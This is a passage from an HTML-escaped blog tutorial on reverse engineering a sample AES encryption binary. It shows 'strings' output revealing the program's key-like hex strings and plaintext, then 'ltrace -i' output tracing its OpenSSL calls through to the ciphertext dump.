&lt;span style=&#34;color: #93A1A1&#34;&gt;_ITM_deregisterTMCloneTable&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;__gmon_start__&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;_Jv_RegisterClasses&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;_ITM_registerTMCloneTable&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_aes_256_cbc&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_free_strings&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;OPENSSL_config&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_cleanup&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_load_crypto_strings&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;OPENSSL_add_all_algorithms_noconf&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_free&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptFinal_ex&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ERR_print_errors_fp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptFinal_ex&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX_new&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_DecryptUpdate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptInit_ex&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;BIO_dump_fp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_EncryptUpdate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;libc.so&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;.6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;_IO_stdin_used&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;puts&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;abort&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;strlen&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;stdout&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;stderr&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;__libc_start_main&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;OPENSSL_1&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;.0.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;GLIBC_2&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;PTRh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;_]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ee12c03ceacdfb5d4c0e67c8f5ab3362&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;d36a4bf2e6dd9c68&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;quick&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;brown&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;fox&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;jumps&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;over&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;lazy&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;dog&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Ciphertext&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Decrypted&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;text&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;2-3-using-ltrace-to-find-the-key:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.3  Using ltrace to Find the Key&lt;/h4&gt;

&lt;p&gt;Finally let’s run ltrace on the binary. The &lt;code&gt;i&lt;/code&gt; switch prints the value of instruction pointer at the time of library call (we will need it later). You can also trace syscalls using the &lt;code&gt;S&lt;/code&gt; (capital S) switch.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running ltrace&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ltrace&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048921&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;__libc_start_main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048b8c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88534&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048cd0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048cc0&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048bbe&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ERR_load_crypto_strings&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xb776dda6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7439a30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048629&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb74266d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x80485d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048bc3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;OPENSSL_add_all_algorithms_noconf&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xb776dda6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7439a30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048629&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb74266d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x80485d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048bcf&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;OPENSSL_config&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7439a30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048629&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb74266d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x80485d0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048bde&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;strlen&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;The quick brown fox jumps over t&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;                      &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048a0f&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CIPHER_CTX_new&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048434&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8049140&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb742e0b4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;         &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048a22&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_aes_256_cbc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048434&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8049140&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb742e0b4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;            &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7735040&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048a47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_EncryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7735040&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048a78&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_EncryptUpdate&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048aa8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_EncryptFinal_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8840c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048ac3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CIPHER_CTX_free&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x90bdce0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff8840c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff88324&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d84&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048c25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Ciphertext is:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Ciphertext&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;                                             &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;15&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x8048c48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BIO_dump_fp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xb75874e0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xbff883ec0000&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f6&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c1&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ae&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;Q4?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;N....mA...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0010&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;de&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;fa&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b9&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;d3&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;......l..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;....6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0020&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ec&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;bc&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;p&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.i....&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a_.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;3&lt;/span&gt;
